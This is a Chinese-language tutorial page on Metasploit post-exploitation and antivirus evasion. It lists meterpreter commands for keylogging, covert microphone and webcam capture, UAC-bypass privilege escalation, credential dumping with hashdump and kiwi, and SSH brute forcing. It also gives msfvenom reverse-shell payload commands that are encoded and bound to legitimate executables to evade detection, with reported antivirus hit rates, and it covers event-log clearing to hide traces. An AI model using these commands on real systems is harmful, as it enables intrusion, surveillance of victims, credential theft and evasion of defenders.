<h4 id="环境准备-2" tabindex="-1"><a class="header-anchor" href="#环境准备-2" aria-hidden="true">#</a> 环境准备</h4>
<ul>
<li>Windows 10 Version 1903/1909</li>
<li>攻击机 python 环境</li>
</ul>
<h2 id="生成木马反弹-shell-windows" tabindex="-1"><a class="header-anchor" href="#生成木马反弹-shell-windows" aria-hidden="true">#</a> 生成木马反弹 shell （Windows）</h2>
<h2 id="生成木马反弹-shell-linux" tabindex="-1"><a class="header-anchor" href="#生成木马反弹-shell-linux" aria-hidden="true">#</a> 生成木马反弹 shell （Linux）</h2>
<h2 id="生成木马反弹-shell-android" tabindex="-1"><a class="header-anchor" href="#生成木马反弹-shell-android" aria-hidden="true">#</a> 生成木马反弹 shell （Android）</h2>
<h1 id="msf-后渗透" tabindex="-1"><a class="header-anchor" href="#msf-后渗透" aria-hidden="true">#</a> msf 后渗透</h1>
<h2 id="后渗透之访问文件系统" tabindex="-1"><a class="header-anchor" href="#后渗透之访问文件系统" aria-hidden="true">#</a> 后渗透之访问文件系统</h2>
<ul>
<li><code v-pre>help</code></li>
<li><code v-pre>ls</code> 或 <code v-pre>dir</code> 查看靶机目录</li>
<li><code v-pre>lls</code> 查看攻击机的目录</li>
<li><code v-pre>getwd</code> 查看靶机当前所处目录</li>
<li><code v-pre>getlwd</code> 查看攻击机当前所处目录</li>
<li><code v-pre>mkdir filename</code></li>
<li><code v-pre>rmdir filename</code></li>
<li><code v-pre>cd</code></li>
<li><code v-pre>edit filename</code></li>
<li><code v-pre>cat filename</code></li>
<li>...</li>
</ul>
<h2 id="后渗透之上传下载文件" tabindex="-1"><a class="header-anchor" href="#后渗透之上传下载文件" aria-hidden="true">#</a> 后渗透之上传下载文件</h2>
<ul>
<li><code v-pre>upload xxxx.exe</code></li>
<li><code v-pre>download xxxx.zip</code></li>
</ul>
<h2 id="后渗透之屏幕截图" tabindex="-1"><a class="header-anchor" href="#后渗透之屏幕截图" aria-hidden="true">#</a> 后渗透之屏幕截图</h2>
<ul>
<li><code v-pre>screenshot</code></li>
</ul>
<h2 id="后渗透之键盘记录" tabindex="-1"><a class="header-anchor" href="#后渗透之键盘记录" aria-hidden="true">#</a> 后渗透之键盘记录</h2>
<ul>
<li><code v-pre>keyscan_start</code></li>
<li><code v-pre>keyscan_dump</code></li>
<li><code v-pre>keyscan_stop</code></li>
</ul>
<h2 id="后渗透之创建账号" tabindex="-1"><a class="header-anchor" href="#后渗透之创建账号" aria-hidden="true">#</a> 后渗透之创建账号</h2>
<ul>
<li><code v-pre>run post/windows/gather/enum_logged_on_users</code></li>
<li><code v-pre>run getgui -u username -p password</code></li>
</ul>
<h2 id="后渗透之音频录制" tabindex="-1"><a class="header-anchor" href="#后渗透之音频录制" aria-hidden="true">#</a> 后渗透之音频录制</h2>
<ul>
<li><code v-pre>record_mic -d 60</code>  持续时间 30 秒（参数是实际时间的 2 倍）</li>
<li><code v-pre>record_mic -p</code> 自动播放</li>
</ul>
<h2 id="后渗透之提权" tabindex="-1"><a class="header-anchor" href="#后渗透之提权" aria-hidden="true">#</a> 后渗透之提权</h2>
<ul>
<li><code v-pre>getuid</code> 查看当前权限。只有 SYSTEM 才可以创建账号</li>
</ul>
<h4 id="提权方法一" tabindex="-1"><a class="header-anchor" href="#提权方法一" aria-hidden="true">#</a> 提权方法一：</h4>
<ul>
<li><code v-pre>getsystem</code> 直接提权</li>
</ul>
<h4 id="提权方法二" tabindex="-1"><a class="header-anchor" href="#提权方法二" aria-hidden="true">#</a> 提权方法二：</h4>
<ul>
<li><code v-pre> getuid</code> 获取当前用户</li>
<li><code v-pre>bg</code>  将当前 Session 挂起，会返回一个 Session id</li>
<li><code v-pre>use exploit/windows/local/ask</code>    USA 绕过提权，使用 ASK 模块</li>
<li><code v-pre>show options</code> 查看需要配置的参数</li>
<li><code v-pre>set session x</code>  配置 session id，刚才挂起的 session</li>
<li><code v-pre>set filename</code>  可以不配置，如果配置，会伪装成这个文件，如 QQ.exe</li>
<li><code v-pre>run</code>  运行</li>
</ul>
<h4 id="提权方法三" tabindex="-1"><a class="header-anchor" href="#提权方法三" aria-hidden="true">#</a> 提权方法三：</h4>
<ul>
<li><code v-pre>getui</code> 获取当前用户</li>
<li><code v-pre>bg</code> 将当前 Session 挂起</li>
<li><code v-pre>search bypassuac</code> 搜索提权模块</li>
<li><code v-pre>use exploit/windows/local/bypassuac_dotnet_profiler</code> 选择要使用的模块（以 dotnet 模块为例）</li>
<li><code v-pre>options</code> 查看需要配置的参数</li>
<li><code v-pre>sessions</code> 查看 session （如果记得挂起的 id ，可以跳过这一步）</li>
<li><code v-pre>set session x</code> 配置 session id</li>
<li><code v-pre>set lhost xxx.xxx.xxx.xxx</code></li>
<li><code v-pre>set lport xxxx</code></li>
<li><code v-pre>getuid</code> 查看当前用户（还是最开始的用户）</li>
<li><code v-pre>getsystem</code> 提权</li>
<li><code v-pre>getuid</code> 查看当前用户（SYSTEM 用户）</li>
</ul>
<h2 id="后渗透之获取登录密码" tabindex="-1"><a class="header-anchor" href="#后渗透之获取登录密码" aria-hidden="true">#</a> 后渗透之获取登录密码</h2>
<blockquote>
<p>以下操作前提是已经提权到 SYSTEM</p>
</blockquote>
<h4 id="抓取自动登录账号密码" tabindex="-1"><a class="header-anchor" href="#抓取自动登录账号密码" aria-hidden="true">#</a> 抓取自动登录账号密码</h4>
<ul>
<li><code v-pre>run windows/gather/credentials/windows_autologin</code></li>
</ul>
<h4 id="导出-sam-数据库本地账户密码文件" tabindex="-1"><a class="header-anchor" href="#导出-sam-数据库本地账户密码文件" aria-hidden="true">#</a> 导出 SAM 数据库本地账户密码文件</h4>
<ul>
<li><code v-pre>run post/windows/gather/smart_hashdump</code>
<ul>
<li>返回结果包含四列：用户名、SID、LM哈希、NTLM哈希（可用MD5解密）</li>
</ul>
</li>
</ul>
<h4 id="导出密码哈希" tabindex="-1"><a class="header-anchor" href="#导出密码哈希" aria-hidden="true">#</a> 导出密码哈希</h4>
<ul>
<li><code v-pre>run hashdump</code></li>
</ul>
<h4 id="使用-kiwi-模块获取" tabindex="-1"><a class="header-anchor" href="#使用-kiwi-模块获取" aria-hidden="true">#</a> 使用 kiwi 模块获取</h4>
<ul>
<li><code v-pre>load kiwi</code> 加载 kiwi 模块</li>
<li><code v-pre>creds_all</code> 直接获取密码</li>
<li><code v-pre>kiwi_cmd sekurlsa::logonpasswords</code> 直接获取密码</li>
</ul>
<h2 id="后渗透之远程监控" tabindex="-1"><a class="header-anchor" href="#后渗透之远程监控" aria-hidden="true">#</a> 后渗透之远程监控</h2>
<h4 id="rdesktop-远控" tabindex="-1"><a class="header-anchor" href="#rdesktop-远控" aria-hidden="true">#</a> rdesktop 远控</h4>
<blockquote>
<p>rdesktop 是 linux 下支持 windows 远程桌面连接的客户端程序，在 linux 系统下可以通过它远程访问 windows 桌面</p>
<p>rdesktop 是 SourceForge 下支持的 GPL 协议开源项目，采用 RDP （远程桌面协议），几乎可以连接 windows 的所有版本</p>
</blockquote>
<ol>
<li>安装 rdesktop
<ul>
<li><code v-pre>apt-get install rdesktop</code></li>
<li><code v-pre>yum -y install rdesktop</code></li>
</ul>
</li>
<li>远程控制
<ul>
<li><code v-pre>rdesktop -u username -p password -g 1920x1080 192.168.xxx.xxx</code>
<ul>
<li><code v-pre>-h</code>  帮助文档</li>
<li><code v-pre>-u</code>  用户名</li>
<li><code v-pre>-p</code>  密码</li>
<li><code v-pre>-a 16</code>  使用 16 位色显示</li>
<li><code v-pre>-f</code>  全屏模式（ctrl+alt+enter 退出全屏）</li>
<li><code v-pre>-g 1027x768</code> 设置分辨率</li>
</ul>
</li>
<li><code v-pre>run post/windows/manage/enable_rdp</code> 如果远程计算机没有开放远程功能，可以在 meterpreter 中启动远程协议</li>
</ul>
</li>
</ol>
<h4 id="vnc-远控" tabindex="-1"><a class="header-anchor" href="#vnc-远控" aria-hidden="true">#</a> vnc 远控</h4>
<ol>
<li>
<p>直接运行</p>
<p><code v-pre>run vnc</code></p>
</li>
</ol>
<h2 id="后渗透之摄像头监控" tabindex="-1"><a class="header-anchor" href="#后渗透之摄像头监控" aria-hidden="true">#</a> 后渗透之摄像头监控</h2>
<ul>
<li><code v-pre>webcam_list</code>  列出所有软硬件摄像头列表</li>
<li><code v-pre>webcam_snap</code>  调用单个摄像头拍照，默认调用编号为 1 的摄像头</li>
<li><code v-pre>webcam_stream</code>  调用单个摄像头直播，默认调用编号为 1 的摄像头</li>
</ul>
<h1 id="msf-进阶" tabindex="-1"><a class="header-anchor" href="#msf-进阶" aria-hidden="true">#</a> msf 进阶</h1>
<h2 id="msf-auxiliary-辅助模块" tabindex="-1"><a class="header-anchor" href="#msf-auxiliary-辅助模块" aria-hidden="true">#</a> msf Auxiliary 辅助模块</h2>
<p><code v-pre>use auxiliary/</code> 或者 <code v-pre>show auxiliay</code> 命令查看所有辅助模块。</p>
<p>目前主要分以下几大类：</p>
<h4 id="admin" tabindex="-1"><a class="header-anchor" href="#admin" aria-hidden="true">#</a> admin</h4>
<hr>
<ul>
<li><code v-pre>/admin/andriod</code></li>
<li><code v-pre>/admin/http/</code></li>
<li><code v-pre>/admin/mysql/</code></li>
<li><code v-pre>/admin/oracle/</code></li>
<li><code v-pre>/admin/vmware/</code></li>
<li><code v-pre>/admin/smb</code></li>
</ul>
<h4 id="dos" tabindex="-1"><a class="header-anchor" href="#dos" aria-hidden="true">#</a> dos</h4>
<hr>
<ul>
<li><code v-pre>/dos/android/</code></li>
<li><code v-pre>/dos/http/</code></li>
<li><code v-pre>/dos/cisco/</code></li>
<li><code v-pre>/dos/dns/</code></li>
<li><code v-pre>/dos/smb/</code></li>
<li><code v-pre>/dos/windows/ftp</code></li>
</ul>
<h4 id="fuzzers" tabindex="-1"><a class="header-anchor" href="#fuzzers" aria-hidden="true">#</a> fuzzers</h4>
<hr>
<ul>
<li><code v-pre>/fuzzers/http/</code></li>
<li><code v-pre>/fuzzers/smb</code></li>
<li><code v-pre>/gather/</code></li>
</ul>
<h4 id="scanner" tabindex="-1"><a class="header-anchor" href="#scanner" aria-hidden="true">#</a> scanner</h4>
<hr>
<ul>
<li><code v-pre>/scanner/portscan/</code></li>
<li><code v-pre>/scanner/ftp/</code></li>
<li><code v-pre>/scanner/http/</code></li>
<li><code v-pre>scanner/ssh/</code></li>
<li><code v-pre>/scanner/smb/</code></li>
<li><code v-pre>/scanner/vmware</code></li>
<li><code v-pre>/scanner/vnc/</code></li>
<li><code v-pre>/scanner/telnet/</code></li>
<li><code v-pre>/scanner/mysql/</code></li>
<li><code v-pre>/scanner/openvas/</code></li>
<li><code v-pre>/scanner/sap/</code></li>
</ul>
<h4 id="server" tabindex="-1"><a class="header-anchor" href="#server" aria-hidden="true">#</a> server</h4>
<hr>
<ul>
<li><code v-pre>/server/</code></li>
</ul>
<h4 id="其他" tabindex="-1"><a class="header-anchor" href="#其他" aria-hidden="true">#</a> 其他</h4>
<hr>
<ul>
<li><code v-pre>whois ip</code> 查询 ip 相关信息</li>
<li><code v-pre>use auxiliary/gather/search_email_conllector</code>  查找邮箱</li>
<li><code v-pre>use auxiliary/gather/enum_dns</code>  DNS 枚举</li>
<li><code v-pre>use auxiliary/scanner/ssh/ssh_login</code>  SSH 爆破</li>
</ul>
<p>也可以通过分类查询指定模块</p>
<p><code v-pre>search type:auxiliary name:smb</code></p>
<h2 id="msf-免杀" tabindex="-1"><a class="header-anchor" href="#msf-免杀" aria-hidden="true">#</a> msf 免杀</h2>
<ol>
<li>
<p>杀软是如何检测恶意代码的？</p>
<blockquote>
<p>特征码和启发式恶意行为。</p>
</blockquote>
</li>
<li>
<p>免杀是什么？</p>
<blockquote>
<p>对特征码进行混淆，打乱代码，避免杀软查杀</p>
</blockquote>
</li>
<li>
<p>免杀的基本方式有哪些？</p>
<blockquote>
<p>自编码处理、自捆绑+编码、多重编码、接口下载、签名伪装</p>
</blockquote>
</li>
</ol>
<h3 id="在线查毒" tabindex="-1"><a class="header-anchor" href="#在线查毒" aria-hidden="true">#</a> 在线查毒</h3>
<p><code v-pre>https://www.virscan.org</code></p>
<h3 id="免杀处理" tabindex="-1"><a class="header-anchor" href="#免杀处理" aria-hidden="true">#</a> 免杀处理</h3>
<h5 id="一、不额外处理直接生成样本" tabindex="-1"><a class="header-anchor" href="#一、不额外处理直接生成样本" aria-hidden="true">#</a> 一、不额外处理直接生成样本</h5>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -f exe -o payload.exe</code></p>
<p>查杀结果： 41% 的杀软报毒</p>
<h5 id="二、msf-自编码处理生成样本-e" tabindex="-1"><a class="header-anchor" href="#二、msf-自编码处理生成样本-e" aria-hidden="true">#</a> 二、MSF 自编码处理生成样本（-e）</h5>
<p><code v-pre>msfvenom --list encoders</code> 查看可用的编码模块</p>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=xxx.xxx.xxx.xxx lport=xxx -f exe -o payload.exe</code></p>
<p>查杀结果： 37% 的杀软报毒</p>
<h5 id="三、msf-自捆绑处理生成样本-x" tabindex="-1"><a class="header-anchor" href="#三、msf-自捆绑处理生成样本-x" aria-hidden="true">#</a> 三、MSF 自捆绑处理生成样本（-x）</h5>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -x AAA.exe -f exe -o payload.exe</code></p>
<p>查杀结果： 37% 的杀软报毒</p>
<h5 id="四、msf-自捆绑-编码处理生成样本-e、-x、-i" tabindex="-1"><a class="header-anchor" href="#四、msf-自捆绑-编码处理生成样本-e、-x、-i" aria-hidden="true">#</a> 四、MSF 自捆绑+编码处理生成样本（-e、 -x、 -i）</h5>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -e x86/shikata_ga_nai -x AAA.exe -i 10 -f exe -o payload.exe</code></p>
<p>查杀结果： 31% 的杀软报毒</p>
<p>增加编码次数 <code v-pre>-i 20</code></p>
<p>查杀结果： 27% 的杀软报毒</p>
<h5 id="五、msf-多重编码生成样本" tabindex="-1"><a class="header-anchor" href="#五、msf-多重编码生成样本" aria-hidden="true">#</a> 五、MSF 多重编码生成样本</h5>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -e x86/shikata_ga_nai -x AAA.exe -i 10 -f raw | msfvenos -e x86/alpha_upper -i 10 raw | msfvenom -e x86/countdown -i 10 -x AAAA.exe -f exe -o payload.exe</code></p>
<h5 id="六、生成-shellcode-使用-c-语言调用" tabindex="-1"><a class="header-anchor" href="#六、生成-shellcode-使用-c-语言调用" aria-hidden="true">#</a> 六、生成 ShellCode 使用 C 语言调用</h5>
<ol>
<li>
<p>在 linux 中利用 msf 的 meterpreter 生成的文件以 .c 形式文件存储，得到机器码：</p>
<p><code v-pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -f c &gt; c0001.c</code></p>
</li>
<li>
<p>修改 c 文件，编译，加壳</p>
</li>
</ol>
<h2 id="msf-清除事件日志" tabindex="-1"><a class="header-anchor" href="#msf-清除事件日志" aria-hidden="true">#</a> msf 清除事件日志</h2>
<ul>
<li>在 meterpreter 中执行 clearev 命令直接清理（包含应用程序、系统日志、安全模块日志。需要 SYSTEM 权限）</li>
</ul>
</div></template>


